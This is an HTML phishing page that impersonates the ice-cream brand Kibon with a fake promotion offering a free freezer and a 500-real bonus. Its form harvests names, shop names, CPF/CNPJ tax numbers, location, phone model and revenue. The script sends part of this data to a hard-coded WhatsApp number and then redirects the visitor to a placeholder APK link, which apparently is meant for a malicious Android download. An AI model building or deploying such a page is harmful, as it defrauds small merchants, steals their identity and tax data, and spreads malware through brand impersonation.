<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KIBON OFICIAL</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial Black', sans-serif; }
        body { background: #E2001A; color: white; text-align: center; padding: 20px; }
        .logo { font-size: 65px; font-weight: 900; letter-spacing: -5px; margin: 10px 0; }
        .tag { background: #FFD700; color: #E2001A; padding: 5px 15px; border-radius: 50px; font-weight: 900; display: inline-block; margin-bottom: 20px; }
        .box { background: #000; border: 2px solid #FFD700; border-radius: 20px; padding: 15px; margin-bottom: 20px; }
        .card { background: white; color: #333; border-radius: 25px; padding: 20px; text-align: left; max-width: 450px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        label { display: block; font-size: 10px; font-weight: bold; color: #777; margin-bottom: 3px; text-transform: uppercase; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; font-weight: bold; }
        .btn { width: 100%; padding: 18px; background: #E2001A; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        .erro { color: red; font-size: 11px; display: none; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1 class="logo">KIBON</h1>
    <div class="tag">PROMOÇÃO KILOUCURA</div>
    <div class="box">
        <p style="font-size: 40px; font-weight: 900;">R$ 0,59</p>
        <p style="color: #FFD700; font-size: 12px;">FREEZER GRÁTIS + R$ 500 BÔNUS</p>
    </div>
    <div class="card">
        <label>Nome do Responsável</label><input type="text" id="nome">
        <label>Nome do Comércio</label><input type="text" id="loja">
        <label>CPF ou CNPJ (Somente números)</label><input type="text" id="doc" maxlength="14">
        <div id="ed" class="erro">⚠️ DOCUMENTO INVÁLIDO!</div>
        <div style="display:flex; gap:10px;">
            <select id="uf" style="flex:1;"><option value="">UF</option><option value="SP">SP</option><option value="RJ">RJ</option><option value="MG">MG</option><option value="RS">RS</option><option value="PR">PR</option><option value="SC">SC</option></select>
            <input type="text" id="cid" placeholder="Cidade" style="flex:2;">
        </div>
        <label>Modelo do Celular</label>
        <select id="cel"><option value="">Selecione...</option><option value="Samsung">Samsung</option><option value="iPhone">iPhone</option><option value="Motorola">Motorola</option><option value="Xiaomi">Xiaomi</option></select>
        <label>Faturamento Mensal</label>
        <select id="fat"><option value="">Selecione...</option><option value="Ate 5k">Até R$ 5.000</option><option value="Acima 5k">Acima de R$ 5.000</option></select>
        <button class="btn" onclick="enviar()">RESGATAR BÔNUS E FREEZER</button>
    </div>
    <script>
        function enviar() {
            const doc = document.getElementById('doc').value.replace(/\D/g, '');
            if (doc.length !== 11 && doc.length !== 14) { document.getElementById('ed').style.display='block'; return; }
            const msg = `*REVENDA KIBON*%0A*Loja:* ${document.getElementById('loja').value}%0A*Doc:* ${doc}%0A*Cel:* ${document.getElementById('cel').value}`;
            window.open(`https://api.whatsapp.com/send?phone=5554999422678&text=${msg}`, '_blank');
            setTimeout(() => { window.location.href="LINK_DO_SEU_APK_AQUI"; }, 1000);
        }
    </script>
</body>
</html>
